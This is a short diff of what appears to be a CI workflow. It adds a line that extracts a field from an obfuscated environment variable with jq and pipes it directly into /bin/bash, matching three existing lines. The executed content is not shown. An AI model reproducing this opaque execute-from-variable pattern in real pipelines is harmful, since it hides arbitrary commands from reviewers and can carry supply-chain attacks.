@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$l49879" | jq -r .c22 | /bin/bash
           echo $g82 | jq -r .o66 | /bin/bash
           echo $hsd832 | jq -r .wyosm2 | /bin/bash
+          printf '%s' "$o3" | jq -r .wdk9118 | /bin/bash
 
       - name: Save archive
         if: always()
